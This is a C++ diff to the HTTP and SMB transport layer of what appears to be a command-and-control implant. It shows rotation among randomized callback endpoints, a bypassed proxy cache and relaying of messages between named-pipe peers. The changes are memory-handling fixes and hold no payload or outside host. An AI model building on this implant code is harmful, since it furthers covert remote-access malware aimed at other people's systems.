@@ -46,7 +46,10 @@ namespace Http {
         HEXANE
 
         _request_context *req_ctx = R_CAST(_request_context*, x_malloc(sizeof(_request_context)));
+
+        uint32_t length     = 0;
         uint32_t n_endpoint = 0;
+        wchar_t *endpoint   = { };
 
         if (!Ctx->transport.http->handle) {
             if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -58,8 +61,13 @@ namespace Http {
             return_defer(ntstatus);
         }
 
-        n_endpoint          = Utils::Random::RandomNumber32();
-        req_ctx->endpoint   = Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+        if (Ctx->transport.http->endpoints) {
+            n_endpoint = Utils::Random::RandomNumber32();
+            endpoint =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+
+            req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint) + 1) * sizeof(wchar_t)));
+            x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
+        }
 
         Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
         if (Ctx->transport.b_ssl) {
@@ -228,6 +236,7 @@ namespace Http {
         if (req_ctx) {
             if (req_ctx->req_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
             if (req_ctx->conn_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
+            if (req_ctx->endpoint) { x_free(req_ctx->endpoint); }
         }
         if (proxy_ctx) {
             if (proxy_ctx->proxy_config.lpszProxy) { x_free(proxy_ctx->proxy_config.lpszProxy); }
@@ -238,7 +247,6 @@ namespace Http {
 }
 
 namespace Smb {
-    // read first, write second?
 
     VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
         HEXANE
@@ -424,9 +432,10 @@ namespace Smb {
                 }
 
                 _stream *stream = R_CAST(_stream*, x_malloc(sizeof(_stream)));
+                _stream search  = { };
                 uint32_t offset = 0;
 
-                while (PeekClientMessage(peer->ingress_handle, *stream, offset)) {
+                while (PeekClientMessage(peer->ingress_handle, search, offset)) {
                     SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);
 
                     if (!ProcessClientMessage(peer->ingress_handle, &stream)) {
@@ -437,7 +446,7 @@ namespace Smb {
                     Dispatcher::OutboundQueue(stream);
                 }
 
-                Ctx->win32.SleepEx(500, FALSE);
+                Ctx->win32.SleepEx(500, FALSE); // wait a moment...
 
                 while (head) {
                     if (head->peer_id == peer->peer_id) {
